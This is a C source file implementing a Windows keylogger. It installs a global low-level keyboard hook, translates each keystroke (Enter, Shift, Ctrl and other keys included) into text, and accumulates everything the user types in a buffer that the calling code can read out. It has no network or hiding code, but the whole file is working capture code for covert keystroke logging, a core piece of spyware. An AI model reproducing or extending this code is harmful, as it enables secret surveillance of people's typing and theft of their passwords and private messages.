#include "keylogger.h"
#include "utils.h"
#include <stdio.h>
#include <string.h>

#define MAX_KEYS 1024

struct Keylogger {
    HHOOK keyboard_hook;
    char key_buffer[MAX_KEYS];
    int buffer_pos;
    bool is_running;
};

static LRESULT CALLBACK keyboard_proc(int nCode, WPARAM wParam, LPARAM lParam);
static void log_key(Keylogger* logger, int key);
static char* vkcode_to_string(DWORD vkCode);

static Keylogger* global_logger = NULL;

Keylogger* keylogger_create(void) {
    Keylogger* logger = safe_malloc(sizeof(Keylogger));
    if (logger) {
        logger->keyboard_hook = NULL;
        logger->buffer_pos = 0;
        logger->is_running = false;
        memset(logger->key_buffer, 0, MAX_KEYS);
    }
    return logger;
}

void keylogger_destroy(Keylogger* logger) {
    if (logger) {
        keylogger_stop(logger);
        safe_free(logger);
    }
}

void keylogger_start(Keylogger* logger) {
    if (!logger->is_running) {
        logger->keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_proc, NULL, 0);
        logger->is_running = true;
        global_logger = logger;
    }
}

void keylogger_stop(Keylogger* logger) {
    if (logger->is_running) {
        UnhookWindowsHookEx(logger->keyboard_hook);
        logger->is_running = false;
        global_logger = NULL;
    }
}

char* keylogger_get_logged_keys(Keylogger* logger) {
    return safe_strdup(logger->key_buffer);
}

static LRESULT CALLBACK keyboard_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && global_logger) {
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
            log_key(global_logger, kbStruct->vkCode);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

static void log_key(Keylogger* logger, int key) {
    char* key_str = vkcode_to_string(key);
    int key_str_len = strlen(key_str);

    if (logger->buffer_pos + key_str_len < MAX_KEYS - 1) {
        strncpy(logger->key_buffer + logger->buffer_pos, key_str, key_str_len);
        logger->buffer_pos += key_str_len;
        logger->key_buffer[logger->buffer_pos] = '\0';
    }
}

static char* vkcode_to_string(DWORD vkCode) {
    static char key_name[16];
    UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);

    switch (vkCode) {
        case VK_RETURN: return "[ENTER]";
        case VK_SPACE: return " ";
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT: return "[SHIFT]";
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL: return "[CTRL]";
        case VK_MENU:
        case VK_LMENU:
        case VK_RMENU: return "[ALT]";
        case VK_CAPITAL: return "[CAPS LOCK]";
        case VK_ESCAPE: return "[ESC]";
        default:
            GetKeyNameTextA(scanCode << 16, key_name, sizeof(key_name));
            return key_name;
    }
}